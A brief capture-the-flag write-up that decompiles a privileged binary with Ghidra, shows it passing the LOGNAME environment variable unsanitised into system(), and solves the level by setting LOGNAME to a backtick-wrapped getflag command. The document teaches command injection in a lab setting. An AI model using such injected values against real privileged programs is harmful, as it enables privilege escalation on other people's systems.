we can decompile the program with ghidra and get C file, inside it we can see this main:

int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

we can see we get the env variable LOGNAME, and this same variable is used to be print.
we need to change LOGNAME to permit to execute getflag, for this we need to use backticks:
export LOGNAME="\`getflag\`"